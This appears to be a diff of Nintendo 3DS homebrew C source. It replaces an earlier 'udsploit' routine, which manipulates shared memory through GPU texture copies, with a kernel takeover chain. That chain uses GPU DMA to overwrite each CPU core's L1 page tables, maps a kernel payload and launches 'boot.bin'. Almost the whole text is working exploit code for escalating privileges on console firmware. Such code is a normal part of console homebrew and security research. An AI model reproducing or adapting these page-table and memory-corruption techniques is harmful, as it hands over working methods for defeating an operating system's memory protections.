@@ -1,165 +1,142 @@
-#include <string.h>
+#include <stdarg.h>
 #include <stdio.h>
-#include <malloc.h>
+#include <string.h>
 
 #include <3ds.h>
-#include <3ds/services/ndm.h>
+#include <3ds/types.h>
 
-#include "../include/nwm/uds.h"
+#include "../kernelhaxcode_3ds/takeover.h"
+#include "kernelhaxcode_3ds_bin.h"
 
-// https://github.com/PabloMK7/Luma3DS-Plugin-sample
-// http://github.com/devkitPro/libctru/blob/36fe1ada5b7ebe53ba4decda36d764a55f8fefb6/libctru/source/system/allocateHeaps.c
-// https://github.com/devkitPro/libctru/blob/36fe1ada5b7ebe53ba4decda36d764a55f8fefb6/libctru/source/system/ctru_init.C
+Result udsploit(void);
+void print(char *msg, ...);
 
-// TEMP, so that we can still allocate memory; this is only needed to run in a 3dsx obviously
-extern char* fake_heap_start;
-extern char* fake_heap_end;
-extern u32 __ctru_heap, __ctru_heap_size, __ctru_linear_heap, __ctru_linear_heap_size;
+PrintConsole topScreenConsole;
+static u8 y = 0;
 
-void __attribute__((weak)) __system_allocateHeaps() {
-	u32 tmp=0;
-
-	__ctru_heap_size = 8 * 1024 * 1024;
-
-	// Allocate the application heap
-	__ctru_heap = 0x08000000;
-	svcControlMemory(&tmp, __ctru_heap, 0x0, __ctru_heap_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
-
-	// Allocate the linear heap
-	svcControlMemory(&__ctru_linear_heap, 0x0, 0x0, __ctru_linear_heap_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
-
-	// Set up newlib heap
-	fake_heap_start = (char*)__ctru_heap;
-	fake_heap_end = fake_heap_start + __ctru_heap_size;
-
+static inline void __flush_prefetch_buffer(void)
+{
+    // Similar to isb in newer Arm architecture versions
+    __asm__ __volatile__ ("mcr p15, 0, %0, c7, c5, 4" :: "r" (0) : "memory");
 }
 
-// la == linear address (output)
-Result allocHeapWithLa(u32 va, u32 size, u32* la)
+// Source: https://github.com/smealum/udsploit/blob/master/source/kernel.c#L11
+static void gspSetTextureCopyPhys(u32 outPa, u32 inPa, u32 size, u32 inDim, u32 outDim, u32 flags)
 {
-	Result ret = 0;
-	u32 placeholder_addr = __ctru_heap + __ctru_heap_size;
-	u32 placeholder_size = 0;
-	u32 linear_addr = 0;
+    // Ignore results... only reason it would be invalid is if the handle itself is invalid
+    const u32 enableBit = 1;
 
-	// allocate linear buffer as big as target buffer
-	printf("allocate linear buffer as big as target buffer\n");
-	ret = svcControlMemory((u32*)&linear_addr, 0, 0, size, 0x10003, 0x3);
-	if(ret) return ret;
+    GSPGPU_WriteHWRegs(0x1EF00C00 - 0x1EB00000, (u32[]){inPa >> 3, outPa >> 3}, 0x8);
+    GSPGPU_WriteHWRegs(0x1EF00C20 - 0x1EB00000, (u32[]){size, inDim, outDim}, 0xC);
+    GSPGPU_WriteHWRegs(0x1EF00C10 - 0x1EB00000, &flags, 4);
+    GSPGPU_WriteHWRegsWithMask(0x1EF00C18 - 0x1EB00000, &enableBit, 4, &enableBit, 4);
 
-	// figure out how much memory is available
-	printf("figure out how much memory is available\n");
-	s64 tmp = 0;
-	ret = svcGetSystemInfo(&tmp, 0, 1);
-	if(ret) return ret;
-	placeholder_size = *(u32*)0x1FF80040 - (u32)tmp; // APPMEMALLOC
-	printf("%08X\n", (unsigned int)placeholder_size);
-
-	// allocate placeholder to cover all free memory
-	printf("allocate placeholder to cover all free memory\n");
-	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3);
-	if(ret) return ret;
-
-	// free linear block
-	printf("free linear block\n");
-	ret = svcControlMemory((u32*)&linear_addr, (u32)linear_addr, 0, size, 1, 0);
-	if(ret) return ret;
-
-	// allocate regular heap to replace it: we know its PA
-	printf("allocate regular heap to replace it\n");
-	ret = svcControlMemory((u32*)&va, (u32)va, 0, size, 3, 3);
-	if(ret) return ret;
-
-	// free placeholder memory
-	printf("free placeholder memory\n");
-	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0);
-	if(ret) return ret;
-
-	if(la) *la = linear_addr;
-
-	return 0;
+    svcSleepThread(25 * 1000 * 1000LL); // should be enough
 }
 
-Result udsploit()
+static inline void gspwn(u32 outPa, u32 inPa, u32 size)
 {
-	Result ret = 0;
+    gspSetTextureCopyPhys(outPa, inPa, size, 0, 0, 8);
+}
 
-	const u32 sharedmem_size = 0x1000;
-	Handle sharedmem_handle = 0;
-	u32 sharedmem_va = 0x0dead000, sharedmem_la = 0;
+static void mapL2TableViaGpuDma(const BlobLayout *layout, void *workBuffer)
+{
+    static const u32 s_l1tables[] = { 0x1FFF8000, 0x1FFFC000, 0x1F3F8000, 0x1F3FC000 };
+    u32 numCores = IS_N3DS ? 4 : 2;
 
-	printf("udsploit: srvGetServiceHandle\n");
-	ret = nwmUdsInit();
-	if(ret) goto fail;
+    // Minimum size of GPU DMA is 16, so we need to pad a bit...
+    u32 l1EntryData[4] = { osConvertVirtToPhys(layout->l2table) | 1 };
+    memcpy(workBuffer, l1EntryData, 16);
 
-	printf("udsploit: srvGetServiceHandle\n");
-	ret = ndmuInit();
-	if(ret) goto fail;
+    // Ignore result
+    GSPGPU_FlushDataCache(workBuffer, 16);
 
-	{
-		printf("udsploit: allocHeapWithPa\n");
-		ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la);
-		if(ret)
-		{
-			sharedmem_va = 0;
-			goto fail;
-		}
+    u32 l1EntryPa = osConvertVirtToPhys(workBuffer);
 
-		printf("udsploit: sharedmem_la %08X\n", (unsigned int)sharedmem_la);
+    for (u32 i = 0; i < numCores; i++) {
+        u32 dstPa = s_l1tables[i] + (KHC3DS_MAP_ADDR >> 20) * 4;
+        gspwn(dstPa, l1EntryPa, 16);
+    }
 
-		printf("udsploit: svcCreateMemoryBlock\n");
-		memset((void*)sharedmem_va, 0, sharedmem_size);
-		ret = svcCreateMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, MEMPERM_READ | MEMPERM_WRITE);
-		if(ret) goto fail;
-	}
+    // No need to clean&invalidate here:
+    // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
+    // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
 
-	printf("udsploit: NDMU_EnterExclusiveState\n");
-	ret = NDMU_EnterExclusiveState(2); // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS
-	if(ret) goto fail;
+    __flush_prefetch_buffer();
+}
 
-	printf("udsploit: NwmUDS_InitializeWithVersion\n");
-	uwmNodeInfo nodeinfo = {0};
-	ret = NwmUDS_InitializeWithVersion(&nodeinfo, sharedmem_handle, sharedmem_size);
-	if(ret) goto fail;
+static Result takeOverKernelAndBeyond(const char *payloadFileName, size_t payloadFileOffset)
+{
+    BlobLayout *layout = (BlobLayout *)linearMemAlign(sizeof(BlobLayout), 0x1000);
+    if (layout == NULL) {
+        return -1;
+    }
 
-	printf("udsploit: NDMU_LeaveExclusiveState\n");
-	ret = NDMU_LeaveExclusiveState();
-	if(ret) goto fail;
+    memset(layout, 0, sizeof(BlobLayout));
+    memcpy(layout->code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
+    khc3dsPrepareL2Table(layout);
 
-	printf("udsploit: NwmUDS_Bind\n");
-	u32 BindNodeID = 1;
-	ret = NwmUDS_Bind(BindNodeID, 0xff0, 1, 0);
-	if(ret) goto fail;
+    // Ensure everything (esp. the layout) is written back into the main memory
+    GSPGPU_FlushDataCache((const void *)0x14000000, 0x700000);
+    __flush_prefetch_buffer();
 
-	{
-		unsigned int* buffer = linearAlloc(sharedmem_size);
+    mapL2TableViaGpuDma(layout, layout->smallWorkBuffer);
 
-		GSPGPU_InvalidateDataCache(buffer, sharedmem_size);
+    khc3dsLcdDebug(true, 128, 64, 0); // brown
+    return khc3dsTakeover(payloadFileName, payloadFileOffset);
+}
 
-		svcSleepThread(1 * 1000 * 1000);
-		GX_TextureCopy((void*)sharedmem_la, 0, (void*)buffer, 0, sharedmem_size, 8);
-		svcSleepThread(1 * 1000 * 1000);
+int main(void)
+{
+    Result ret = 0;
 
-		int i;
-		for(i = 0; i < 8; i++) printf("%08X %08X %08X %08X\n", buffer[i * 4 + 0], buffer[i * 4 + 1], buffer[i * 4 + 2], buffer[i * 4 + 3]);
-					
-		buffer[3] = 0x1EC40140 - 8;
+    gfxInitDefault();
+    consoleInit(GFX_TOP, &topScreenConsole);
+    consoleClear();
 
-		GSPGPU_FlushDataCache(buffer, sharedmem_size);
-		GX_TextureCopy((void*)buffer, 0, (void*)sharedmem_la, 0, sharedmem_size, 8);
-		svcSleepThread(1 * 1000 * 1000);
+    print("start to udsploit");
+    print("Exit: any key");
 
-		linearFree(buffer);
-	}
+    while (aptMainLoop()) {
+        gfxFlushBuffers();
+        gfxSwapBuffers();
+        gspWaitForVBlank();
 
-	printf("udsploit: NwmUDS_Unbind\n");
-	ret = NwmUDS_Unbind(BindNodeID);
-	if(ret) goto fail;
+        hidScanInput();
+        u32 kDown = hidKeysDown();
 
-	fail:
-	nwmUdsExit();
-	ndmuInit();
-	if(sharedmem_handle) svcCloseHandle(sharedmem_handle);
-	if(sharedmem_va) svcControlMemory((u32*)&sharedmem_va, (u32)sharedmem_va, 0, sharedmem_size, 0x1, 0);
-	return ret;
+        if (kDown & KEY_START) {
+            ret = udsploit();
+            if (R_SUCCEEDED(ret)) {
+                ret = takeOverKernelAndBeyond("boot.bin", 0);
+                print("Taking over kernel: 0x%08lX", ret);
+
+                if (R_SUCCEEDED(ret)) {
+                    print("Done.");
+                } else if (R_SUMMARY(ret) == RS_CANCELED) {
+                    printf("Canceled.\n");
+                }
+            } else {
+                print("Failed");
+            }
+        } else if (kDown) {
+            break;
+        }
+    }
+
+    consoleClear();
+    gfxExit();
+    return 0;
+}
+
+void print(char *msg, ...)
+{
+    va_list args;
+    char s[100] = {0};
+
+    va_start(args, msg);
+    vsnprintf(s, sizeof(s), msg, args);
+    va_end(args);
+
+    printf("\x1b[%u;1H %s", ++y, s);
 }
